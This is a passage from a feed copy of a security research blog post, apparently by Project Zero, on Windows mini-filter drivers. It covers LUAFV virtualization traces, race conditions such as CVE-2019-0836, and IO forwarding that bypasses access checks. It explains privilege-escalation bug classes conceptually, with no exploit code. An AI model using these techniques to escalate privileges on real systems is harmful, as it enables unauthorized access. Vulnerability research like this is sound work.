c23"&gt;C:\Users\admin\AppData\Local\VirtualStore\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;WriteFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c18" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;Offset: 0, Length: 538&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c51 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;ReadFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;END OF FILE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c18" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;Offset: 538, Length: 16,384&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c51 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Users\admin\AppData\Local\VirtualStore\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;CloseFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c18" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c51 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;CloseFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c18" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c51 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Users\admin\AppData\Local\VirtualStore\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;CreateFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c18" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;Desired Access: Read Data, Write Data&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c51 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c33 c53" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Users\admin\AppData\Local\VirtualStore\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SetEndOfFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c33" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c18" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;EndOfFile: 0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c51 c67" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53 c67" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Users\admin\AppData\Local\VirtualStore\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c72 c67" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;WriteFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13 c67" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c41 c67" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;Offset: 0, Length: 68, Priority: Normal&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c51" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;3&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c72" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;CloseFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c41" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c3"&gt;&lt;td class="c51" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c53" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;C:\Users\admin\AppData\Local\VirtualStore\Windows\System32\license.rtf&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c72" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;CloseFile&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c13" colspan="1" rowspan="1"&gt;&lt;p class="c11"&gt;&lt;span class="c25 c23"&gt;SUCCESS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c41" colspan="1" rowspan="1"&gt;&lt;p class="c11 c8"&gt;&lt;span class="c25 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;You can see that the list of events is much longer in the second case (I&amp;rsquo;ve even removed some for brevity). For event 0 it&amp;rsquo;s no longer a single create IO request for the &lt;/span&gt;&lt;span class="c21"&gt;license.rtf&lt;/span&gt;&lt;span&gt;&amp;nbsp;file. As the user doesn&amp;rsquo;t have write access when the create call is made to the file system it results in an ACCESS DENIED error. The &lt;/span&gt;&lt;span class="c21"&gt;LUAFV &lt;/span&gt;&lt;span class="c1"&gt;driver sees the error in its post-create callback and as virtualization is enabled it makes a second create for only read access. This second create succeeds. Due to the altitude of LUAFV this process is normally hidden from the Process Monitor.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;In the first table event ID 2 we saw the caller setting the file length to 0. However in the second table we now see that the virtual file needs to be created and the contents of the original file are copied into the new virtual file. Only after that operation has been completed will the length of the file be set to 0. The last 2 events are more or less the same.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;I hope this is a clear demonstration both of how the altitude directly affects the operation of mini-filter drivers as well as how much file information you might be missing in Process Monitor without realizing it.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.f1fhx5giwpkb"&gt;&lt;span class="c5"&gt;Concurrency and Reentrancy&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;The IO manager is designed to operate asynchronously. It&amp;rsquo;s possible that multiple threads could be calling into the same IO driver at the same time and the filter manager is no different. There&amp;rsquo;s no explicit locking in the filter manager which would prevent multiple IO requests being dispatched at the same time to the same file object. This can lead to concurrency and reentrancy issues.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;The filter driver can assign shared state based on the file stream or file object. This can be extracted in the filter when operating on the file and used to store and retrieve the current state information. If you dispatch multiple IO requests to the same file it can result in an invalid state or memory corruption issues.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;An example of this kind of issue is &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1774"&gt;CVE-2019-0836&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which was a race condition in the LUAFV driver related to handling of the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_section_object_pointers"&gt;SECTION_OBJECT_POINTERS&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure in the file object. Basically by racing a read against a write IO request on the same file it was possible to get the wrong &lt;/span&gt;&lt;span class="c21"&gt;SECTION_OBJECT_POINTERS&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;structure assigned to the virtual file allowing a normal user to bypass access checks and map a read-only file as writable.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;To solve this problem the driver needs to not maintain complex state between pre and post operation callbacks or over any calls out to any API which could be trapped by a user-mode application. &lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.wiz3rbkjh9m3"&gt;&lt;span class="c5"&gt;Incorrect Forwarding of IO Operations&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span&gt;We showed earlier how to retarget an IO operation to another file object by switching the &lt;/span&gt;&lt;span class="c21"&gt;TargetFileObject &lt;/span&gt;&lt;span class="c1"&gt;pointer. This needs to be done very carefully as when working with file object pointers directly almost any operation can be performed on them. For example, if a file is opened read-only a write operation can still be dispatched to the file object itself and it&amp;rsquo;ll succeed.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The only thing which prevents a user-mode application from doing this is the kernel checks that the handle passed by the application to the &lt;/span&gt;&lt;span class="c21"&gt;NtWriteFile&lt;/span&gt;&lt;span&gt;&amp;nbsp;system call has the &lt;/span&gt;&lt;span class="c21"&gt;FILE_WRITE_DATA&lt;/span&gt;&lt;span&gt;&amp;nbsp;access right set. If not the system call can return &lt;/span&gt;&lt;span class="c21"&gt;STATUS_ACCESS_DENIED&lt;/span&gt;&lt;span class="c1"&gt;. However, if the handle has write access to a file object, but the filter driver redirects that operation to a read-only file then the check is bypassed and the user can write to a file they don&amp;rsquo;t necessarily control.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;Another place this can happen is the dispatch of IO control codes. Each control code has a flag which indicates if the file handle requires read and/or write access to be dispatched. This check is performed in the IO manager before the request ever makes it to the file system. If the filter drivers blindly forward IO control codes to a separate file it could send a code which normally requires write access on the handle bypassing security checks.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The LUAFV driver is a good example of a mini-filter driver where this forwarding takes place. The previously mentioned issue, &lt;/span&gt;&lt;span&gt;CVE-2019-0836 while it&amp;rsquo;s a concurrency issue also relies on the fact that the file object can be written to even though it was opened read-only.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c55" id="h.f0bqmkr3x5up"&gt;&lt;span class="c14"&gt;Summary&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;In summary I think that mini-filter drivers are an under-appreciated source of privilege escalation bugs on Windows. In part that&amp;rsquo;s because they&amp;rsquo;re not easy to understand. They have complex interactions with the rest of the IO system which makes understanding difficult but can introduce really subtle and interesting issues. I hope I&amp;rsquo;ve given you enough information to better understand how mini-filter drivers function, how you communicate with them and what sorts of unique bug classes you might discover.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;If you want some more information a good blog on the inner workings of filters drivers is &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="http://fsfilters.blogspot.com/"&gt;Of Filesystems and Other Demons&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. It&amp;rsquo;s not been updated in a long while but it still contains some valuable information. You can also refer to &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts"&gt;MSDN&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which has a fairly comprehensive section on mini-filters as well as the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://github.com/microsoft/Windows-driver-samples/tree/master/filesys/miniFilter"&gt;Windows Driver Kit sample code&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Finally as a reminder I&amp;rsquo;ve uploaded a filter manager &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://gist.github.com/tyranid/49d8a1b9e53bba4eac40df32e15d4a98"&gt;header file&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;for use in reverse engineering tools such as IDA Pro.&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/7224812645464338214/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/7224812645464338214" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/7224812645464338214" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html" title="Hunting for Bugs in Windows Mini-Filter Drivers" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-ft1Qb-E9rrA/X_9xlhIu_EI/AAAAAAAAaog/B0AV8WsW5wQrUX17mHfM11ku8zUik-7xwCNcBGAsYHQ/s72-c/Device%2BStack.png" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
</feed>